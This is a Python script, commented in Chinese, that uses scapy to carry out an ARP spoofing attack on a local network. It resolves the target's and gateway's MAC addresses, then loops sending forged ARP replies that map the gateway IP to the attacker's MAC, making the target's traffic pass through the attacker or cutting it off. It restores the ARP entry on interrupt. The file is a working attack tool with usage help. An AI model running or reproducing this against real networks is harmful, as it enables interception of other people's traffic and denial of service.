#/usr/bin/python3
#--*-- coding:utf-8 --*--

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


import sys,time
from scapy.all import *
from get_ip_mac import *
from get_mac_arp import *
import io

sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf-8')

# ping = sr(IP(dst='192.168.100.1',ttl=1,id=156)/ICMP(id=12,seq=1)/b'fuck')
# print (ping[0].res[0][1][1].fields)


# result_raw = srp(Ether(src=localmac,dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,hwsrc=localmac,hwdst='00:00:00:00:00:00',psrc=
# 	localip,pdst=dip),iface=ifname,)

# print (result_raw[0].res[0][0][1].fields)


class ATTACK(object):
	def __init__(self,localmac,goalmac,gatip,gatmac,goalip,ifname):
		self.localmac = localmac
		self.goalmac = goalmac
		self.gatip = gatip
		self.gatmac = gatmac
		self.goalip = goalip
		self.ifname = ifname
		print (self.goalmac,self.gatmac)

	def ARP_ATTACK_ACTION(self,):
		#localmac 攻击者mac地址,如果想让被攻击者流量经过自己,那么就填写自己的mac,否者乱填
		#goalmac 一般为动态获取,被攻击者的mac地址不能错误,否者被攻击者无法接收到攻击请求
		#gatip 这个一般为网关ip等,因为需要伪装此ip的mac地址,所以这里不能随便填写
		#goalip  被攻击者的ip,只需此ip及mac指路,ip和地址都不能填写错误,否则无法攻击
		#ifname  从哪个接口开始攻击

		while True:
			print ('正在持续攻击IP：'+ self.goalip,flush=True)   #sleep由于缓冲关系,只有大于8k或者换行\n,print才显示,所以加上flush
			import signal
			signal.signal(signal.SIGINT,self.sigint_handler)
			sendp(Ether(src=self.localmac,dst=self.goalmac)/
				ARP(op=2, hwsrc=self.localmac,hwdst=self.goalmac,psrc=self.gatip,pdst=self.goalip),iface=self.ifname,verbose=False)
			self.time_test()

	def time_test(self):
		time.sleep(1)

	def sigint_handler(self,signum,frame):
		print('执行恢复操作')
		time.sleep(1)   #这里一定要睡眠一秒,不然不知道为什么请求发送无法恢复,可能是arp的原理
		'''
			主要是sendp这里的参数,  Ether是以太网头部,这里不多解释,主要是ARP后面,op=2是回应,
			hwsrc=是回应源mac地址,
			hwdst=是目的mac地址(被攻击者的mac)
			psrc= 是要恢复的ip,一般是网关ip
			pdst= 被攻击者的ip
		'''
		sendp(Ether(src=self.gatmac,dst=self.goalmac)/
			ARP(op=2, hwsrc=self.gatmac,hwdst=self.goalmac,psrc=self.gatip,pdst=self.goalip),iface=self.ifname,verbose=False)
		print ('被攻击者:' + self.goalip + ' ,ARP表: ' + self.gatip + ' ,MAC地址已恢复为: ' + self.gatmac,)
		sys.exit()



# ARP_ATTACK('00:0c:29:75:0a:3c','00:0c:29:63:c1:fc','192.168.100.2','192.168.100.100','eno16777736')


if __name__ == "__main__":
	if len(sys.argv) == 4:
		ip_info = get_ip_mac(sys.argv[1])
		ifname = sys.argv[1]
		goalip = sys.argv[2]
		gatip = sys.argv[3]

		try:
			for ip_info in ip_info:
				for ifname,ip_mac in ip_info.items():
					for ip,mac in ip_mac.items():
						localip=ip
						localmac=mac
		except Exception as e:
			sys.exit()

		goalmac = get_mac_arp(localip,localmac,goalip,ifname)
		gatmac = get_mac_arp(localip,localmac,gatip,ifname)

		# print (localmac,goalmac,gatip,goalip,ifname)
		print ('开始攻击')
		ATTACK_ACTION = ATTACK(localmac,goalmac,gatip,gatmac,goalip,ifname)
		ATTACK_ACTION.ARP_ATTACK_ACTION()
		# ARP_ATTACK(localmac,goalmac,gatip,goalip,ifname)
		
	else:
		print ('\033[1;31;47m帮助: 网卡名 要攻击的IP地址 要伪造的IP地址\033[0m')
		get_ip_mac()
